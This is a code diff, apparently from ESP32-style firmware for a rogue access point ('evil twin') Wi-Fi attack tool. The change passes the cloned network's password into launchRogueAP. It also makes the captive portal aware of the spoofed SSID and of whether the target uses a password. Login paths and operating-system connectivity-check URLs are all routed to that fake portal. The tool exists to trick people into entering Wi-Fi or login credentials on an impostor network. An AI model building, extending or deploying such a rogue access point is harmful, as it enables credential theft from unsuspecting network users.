@@ -38,7 +38,7 @@ static void registerAdminRoutes() {
     webServer.on("/control", HTTP_POST, []() {
         String action = webServer.arg("action");
         if (action == "start") {
-            if (launchRogueAP(activeTarget, AP_IP_ADDR)) {
+            if (launchRogueAP(activeTarget, activeTarget.password, AP_IP_ADDR)) {
                 isRogueApRunning = true;
                 currentRogueSsid = activeTarget.ssid;
                 rogueApStartTime = millis();
@@ -70,28 +70,28 @@ static void registerAdminRoutes() {
 
 static void registerCaptiveRoutes() {
     webServer.on("/", HTTP_GET, []() {
-        serveCaptivePortal(webServer, isRogueApRunning);
+        serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid);
     });
     webServer.on("/", HTTP_POST, []() {
-        serveCaptivePortal(webServer, isRogueApRunning);
+        serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid);
     });
 
-    webServer.on("/login", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning); });
-    webServer.on("/login", HTTP_POST, []() { serveCaptivePortal(webServer, isRogueApRunning); });
-    webServer.on("/login.php", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning); });
-    webServer.on("/login.php", HTTP_POST, []() { serveCaptivePortal(webServer, isRogueApRunning); });
-    webServer.on("/submit", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning); });
-    webServer.on("/submit", HTTP_POST, []() { serveCaptivePortal(webServer, isRogueApRunning); });
-    webServer.on("/post", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning); });
-    webServer.on("/user", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning); });
-    webServer.on("/action", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning); });
-    webServer.on("/generate_204", []() { serveCaptivePortal(webServer, isRogueApRunning); });
-    webServer.on("/gen_204", []() { serveCaptivePortal(webServer, isRogueApRunning); });
-    webServer.on("/ncsi.txt", []() { serveCaptivePortal(webServer, isRogueApRunning); });
-    webServer.on("/hotspot-detect.html", []() { serveCaptivePortal(webServer, isRogueApRunning); });
+    webServer.on("/login", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
+    webServer.on("/login", HTTP_POST, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
+    webServer.on("/login.php", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
+    webServer.on("/login.php", HTTP_POST, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
+    webServer.on("/submit", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
+    webServer.on("/submit", HTTP_POST, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
+    webServer.on("/post", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
+    webServer.on("/user", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
+    webServer.on("/action", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
+    webServer.on("/generate_204", []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
+    webServer.on("/gen_204", []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
+    webServer.on("/ncsi.txt", []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
+    webServer.on("/hotspot-detect.html", []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
 
     webServer.onNotFound([]() {
-        serveCaptivePortal(webServer, isRogueApRunning);
+        serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid);
     });
 }
 
